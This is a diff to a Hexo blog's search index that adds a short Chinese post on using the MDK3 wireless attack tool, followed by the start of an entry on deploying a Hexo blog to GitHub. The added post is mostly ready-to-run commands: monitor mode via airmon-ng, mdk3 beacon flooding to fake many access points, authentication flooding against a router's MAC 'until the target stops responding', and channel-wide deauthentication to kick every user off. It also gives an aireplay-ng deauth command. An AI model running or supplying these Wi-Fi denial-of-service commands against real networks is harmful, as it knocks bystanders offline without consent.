@@ -4,6 +4,46 @@
   
     
     <entry>
+      <title><![CDATA[mdk3工具使用]]></title>
+      <url>http://qinshenhui.github.io/2017/02/26/mdk3%E5%B7%A5%E5%85%B7/</url>
+      <content type="html"><![CDATA[<pre><code>“ MDK3 是一款无线DOS 攻击测试工具，能够发起Beacon Flood、Authentication DoS、Deauthentication/Disassociation Amok 等模式的攻击,另外它还具有针对隐藏ESSID 的暴力探测模式、802.1X 渗透测试、WIDS干扰等功能”。
+</code></pre><p>​    </p>
+<h2 id="0x00-前期准备"><a href="#0x00-前期准备" class="headerlink" title="0x00 前期准备"></a>0x00 前期准备</h2><p>系统环境:Kali Linux<br>将网卡设置为监听模式</p>
+<blockquote>
+<p>airmon-ng start wlan0</p>
+</blockquote>
+<h2 id="0x01-beacon泛洪攻击"><a href="#0x01-beacon泛洪攻击" class="headerlink" title="0x01 beacon泛洪攻击"></a>0x01 beacon泛洪攻击</h2><p>可以伪造大量ap</p>
+<blockquote>
+<p>mdk3 mon0 b -n 单个ssid -c 信道 -s 200 -a</p>
+<p>mdk3 mon0 b -n 单个ssid -w(wep加密) -c 信道 -s 200 </p>
+<p>mdk3 mon0 b -f 文件名 ssid -a -h -c 信道 -s 200</p>
+</blockquote>
+<h2 id="0x02-DOS攻击"><a href="#0x02-DOS攻击" class="headerlink" title="0x02 DOS攻击"></a>0x02 DOS攻击</h2><blockquote>
+<p>mdk3 网卡 a -a 路由mac -s 攻击速率</p>
+</blockquote>
+<p>针对mac地址进行洪水攻击,直到目标无响应</p>
+<h2 id="0x03-强制解除验证解除连接"><a href="#0x03-强制解除验证解除连接" class="headerlink" title="0x03 强制解除验证解除连接"></a>0x03 强制解除验证解除连接</h2><blockquote>
+<p>mdk3 网卡 d -c 信道</p>
+</blockquote>
+<p>这样会把使用所有这个信道的路由器的人,全部踹下网</p>
+<p>或者也可以使用aircrack-ng套件</p>
+<blockquote>
+<p>aireplay-ng -0 数量 -a APmac -c 客户端mac 网卡</p>
+</blockquote>
+<p>不过这个只是针对一个路由器</p>
+<p>That’s all.</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> tools </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[使用Hexo在github上部署属于自己的个人博客]]></title>
       <url>http://qinshenhui.github.io/2017/02/25/%E4%BD%BF%E7%94%A8Hexo%E5%9C%A8github%E4%B8%8A%E9%83%A8%E7%BD%B2%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
       <content type="html"><![CDATA[<h1 id="使用Hexo在github上部署属于自己的个人博客"><a href="#使用Hexo在github上部署属于自己的个人博客" class="headerlink" title="使用Hexo在github上部署属于自己的个人博客"></a>使用Hexo在github上部署属于自己的个人博客</h1><p>其实网上也有很多很多这种教程,但是在学习了别人的之后,自己进行一次复现,当做是复习岂不是妙哉 :)</p>
